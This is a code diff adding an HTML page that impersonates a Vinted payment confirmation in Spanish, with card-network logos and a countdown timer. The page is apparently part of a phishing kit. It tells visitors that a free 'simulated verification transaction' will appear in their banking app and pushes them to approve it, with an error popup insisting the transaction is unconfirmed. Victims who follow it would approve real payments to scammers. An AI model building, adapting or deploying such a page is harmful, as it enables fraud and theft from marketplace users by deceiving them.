@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="./styles/style.css" />
+    <title>Vinted</title>
+  </head>
+  <body>
+    <header>
+      <div class="logo-main">
+        <a href="https://www.vinted.es/">
+          <img src="./images/logo.svg" alt="" />
+        </a>
+      </div>
+
+      <div class="logos">
+        <a>
+          <img src="./images/visa.svg" alt="" />
+        </a>
+        <a>
+          <img src="./images/mastercard.png" alt="" />
+        </a>
+      </div>
+    </header>
+    <main>
+      <div class="container">
+        <div class="error-popup-container">
+          <div class="error-popup-content">
+            <div class="error-popup-content-closer">
+              <img src="./images/closer.svg"/>
+            </div>
+            <div class="error-popup-elements">
+              <div class="error-popup-element-error">
+                <img src="./images/error.svg"/>
+              </div>
+              <div class="error-popup-element-title">
+                <a>¡Error! ¡Transacción no confirmada!</a>
+              </div>
+              <div class="error-popup-element-paragraph">
+                <a>Compruebe su aplicación móvil del banco y autorice la transacción de verificación.</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="content">
+          <div class="content-title">
+            <p>Confirmacion de Transacction</p>
+          </div>
+
+          <div class="content-photos">
+            <div class="timer-container">
+              <div class="timer">
+                <svg
+                  class="base-timer__svg"
+                  viewBox="0 0 100 100"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <g class="base-timer__circle">
+                    <circle
+                      class="base-timer__path-elapsed"
+                      cx="50"
+                      cy="50"
+                      r="45"
+                    ></circle>
+                    <path
+                      id="base-timer-path-remaining"
+                      stroke-dasharray="283"
+                      class="base-timer__path-remaining green"
+                      d="
+                          M 50, 50
+                          m -45, 0
+                          a 45,45 0 1,0 90,0
+                          a 45,45 0 1,0 -90,0
+                        "
+                    ></path>
+                  </g>
+                </svg>
+                <span class="timer-value">5:00</span>
+              </div>
+            </div>
+            <a>
+              <img class="mobile" src="./images/mobile.png" alt="" />
+            </a>
+          </div>
+
+          <div class="content-paragraph">
+            <a>En un plazo de 3 minutos, aparecerá una transacción de verificación en la aplicación bancaria que deberá confirmarse. Tenga en cuenta que la confirmación de la transacción de verificación es gratuita. Se trata de una transacción simulada para confirmar que usted es el propietario de su cuenta. Tras confirmar el mensaje PUSH de verificación, escriba "hecho" en este chat para pasar al siguiente paso</a>
+          </div>
+
+          <div class="content-btns">
+            <div class="passcode-input">
+              <div class="campo">
+                <a
+                  >El campo de introducción del código no debe estar vacío!
+                  Continuar</a
+                >
+              </div>
+            </div>
+
+            <div class="continuar">
+              <a>¡Confirmado!</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div>
+        <img src="./images/footer.png" />
+      </div>
+    </footer>
+
+    <script src="./scripts/script.js"></script>
+  </body>
+</html>
